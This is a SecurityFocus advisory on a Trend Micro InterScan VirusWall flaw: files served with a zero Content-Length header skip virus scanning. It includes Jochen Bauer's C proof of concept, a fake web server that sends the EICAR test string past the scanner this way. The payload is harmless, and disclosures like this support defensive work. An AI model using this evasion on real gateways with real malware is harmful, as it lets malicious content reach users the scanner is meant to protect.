source: http://www.securityfocus.com/bid/4265/info

Trend Micro InterScan VirusWall is a high performance internet gateway virus scanning package. It is capable of scanning incoming content over HTTP, SMTP and FTP for viruses and malicious code.

A vulnerability has been reported in some versions of VirusWall. An option exists called "Skip scanning if Content-length equals 0", which is enabled by default. A malicious web server may return infected content with this header set to 0, and bypass the VirusWall scanner. As many popular client programs will ignore this header and display the content, this may allow malicious content to bypass VirusWall and still be interpreted by a client system.

Other versions of VirusWall may share this vulnerability. This has not been confirmed. 

/*
Trend Micro InterScan VirusWall HTTP proxy content scanning circumvention proof of concept code

Copyright 2002 Jochen Bauer, Inside Security IT Consulting GmbH <jtb@inside-security.de>
Compiled and tested on SuSE Linux 7.3
This program is for testing purposes only, any other use is prohibited!
*/

#include <stdio.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>

#define BUFFERSIZE 4096

int main(int argc,char *argv[])
{
  int new,dummy,n,s;
  unsigned short port;
  struct sockaddr_in remote,local; 
  struct in_addr remote_ip;
  char *remote_host,*recvbuffer,*sendbuffer;

  char header[]="HTTP/1.0 200 OK\r\nConnection: close\r\nContent-Type: application/binary\r\nContent-Length: 0\r\n\r\n";
  char eicar[]="X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";  

  /*get port number from cmdline*/
  if(argv[1]==NULL)
    {
      printf("Usage: %s port\n",argv[0]);
      exit(1);
    }  
  else
    port=atoi(argv[1]);

  printf("Fake web server starting......\n");

  /*get a socket*/
  s=socket(AF_INET,SOCK_STREAM,6);
  if(s<0)
    {
      perror("socket");
      exit(-1);
    }
  
  /*bind socket to a local port*/
  local.sin_family=AF_INET;
  local.sin_port=htons(port);
  local.sin_addr.s_addr=htonl(INADDR_ANY);
  n=bind(s,(struct sockaddr *)&local,sizeof(struct sockaddr));
  if(n<0)
    {
      perror("bind");
      exit(-1);
    }
  
  /*initiate listening on socket*/
  n=listen(s,5);
  if(n<0)
    {
      perror("listen");
      exit(-1);
    }
  printf("Listening on port %i/tcp\n",port);
  
  /*accept connections on socket*/
  new=accept(s,(struct sockaddr *)&remote,&dummy);
  if(new<0)
    {
      perror("accept");
      exit(-1);
    }
     
  /*print connection info*/
  remote_host=(char *)calloc(24,1);
  remote_ip.s_addr=remote.sin_addr.s_addr;
  strncpy(remote_host,inet_ntoa(remote_ip),24);
  printf("connection from: %s\n",remote_host);

  /*get data*/
  recvbuffer=calloc(BUFFERSIZE,1);
  n=recv(new,recvbuffer,BUFFERSIZE,0);
  recvbuffer[n]=0; /*terminate string*/
  printf("\nData from Browser:\n"); 
  printf("%s\n",recvbuffer);

  /*send eicar virus*/
  sendbuffer=calloc(BUFFERSIZE,1);
  strcat(sendbuffer,header);
  strcat(sendbuffer,eicar);
  printf("sending: \n%s\n",sendbuffer);
  n=write(new,sendbuffer,strlen(sendbuffer));

  /*clean up*/
  printf("Terminating.\n");
  close(new);
  close(s);
  return(0);
}